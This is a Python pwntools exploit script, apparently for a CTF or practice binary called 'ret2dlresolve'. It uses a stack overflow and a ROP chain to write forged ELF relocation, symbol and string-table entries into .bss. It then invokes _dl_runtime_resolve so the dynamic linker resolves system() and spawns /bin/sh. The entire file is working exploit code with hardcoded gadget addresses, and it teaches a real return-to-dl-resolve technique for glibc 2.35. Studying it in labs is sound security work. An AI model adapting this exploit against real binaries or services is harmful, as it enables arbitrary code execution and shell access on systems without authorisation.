#!/usr/bin/python3
from pwn import *

elf = ELF('./ret2dlresolve')

io = elf.process()


gs = '''
	b *0x000000000040101a
	dir ~/glibc-2.35/
	b _dl_fixup
	b system
	b elf_machine_fixup_plt
	c

'''

def attach_gdb():
	if args.GDB:
		gdb.attach(io, gdbscript=gs)

def align(addr):
	return (0x18 - (addr) % 0x18)

bss = 0x404010

offset_to_rip = 0x28

_dl_runtime_resolve = 0x401020

SYMTAB = 0x4003c0 # symbol table
STRTAB = 0x400420 # string table
JMPREL = 0x4004d0 # realocation table

# fake .rela.plt

fake_JMPREL = bss
fake_JMPREL += align(fake_JMPREL-JMPREL)

reloc_arg = int((fake_JMPREL-JMPREL) / 0x18)

log.info(f'fake JMPREL @ 0x{fake_JMPREL:02x}')

log.info(f'reloc_arg @ 0x{reloc_arg:02x}')


# fake .dynsym

fake_SYMTAB = fake_JMPREL+0x18
fake_SYMTAB += align(fake_SYMTAB-SYMTAB)

log.info(f'fake SYMTAB @ 0x{fake_SYMTAB:02x}')

r_info = int(((fake_SYMTAB-SYMTAB)/0x18)) << 32 | 0x7

log.info(f'reloc->r_info @ 0x{r_info:02x}')
#log.info(f'r_info @ 0x{r_info:02x}')

# fake .dynstr

fake_STRTAB = fake_SYMTAB+0x18
st_name = fake_STRTAB-STRTAB

log.info(f'fake STRTAB @ 0x{fake_STRTAB:02x}')
log.info(f'sym->st_name @ 0x{st_name:02x}')

# crafting fake data structures

Elf64_Rela = b''
Elf64_Rela += p64(0x404000) # GOT address where address will be written (any where)
Elf64_Rela += p64(r_info) # index to symtab entry
Elf64_Rela += p64(0) # padding


Elf64_Sym = b''
Elf64_Sym += p32(st_name) 	# st_name
Elf64_Sym += p8(0x12)		# st_info
Elf64_Sym += p8(0)		# st_other -> if (__builtin_expect (sym->st_other & 0x3, 0) == 0)
Elf64_Sym += p16(0)		# st_shndx
Elf64_Sym += p64(0)		# st_value
Elf64_Sym += p64(0)		# st_size



# rop chain to write fake structures to bss

'''
x64 calling convention

rdi -> first arg
rsi -> second argument
rdx -> third arg

'''
sh = fake_JMPREL+0x48

pop_rdi_ret = 0x0000000000401150 #  pop rdi; ret; 
pop_rsi_ret = 0x0000000000401152 #  pop rsi; ret; 
ret = 0x000000000040101a

rop = b''
rop += p64(pop_rdi_ret)
rop += p64(0)
rop += p64(pop_rsi_ret)
rop += p64(fake_JMPREL)
rop += p64(elf.plt.read)
rop += p64(ret)
rop += p64(pop_rdi_ret)
rop += p64(sh)
rop += p64(_dl_runtime_resolve)
rop += p64(reloc_arg)


payload = b'A'*offset_to_rip
payload += rop


# attach_gdb()

io.send(payload)

resolver_data = b''
resolver_data += Elf64_Rela
resolver_data += b'A'*16 # padding due to alignment
resolver_data += Elf64_Sym
resolver_data += b'system\x00\x00'
resolver_data += b'/bin/sh\x00'


#pause()

io.send(resolver_data)

io.interactive()
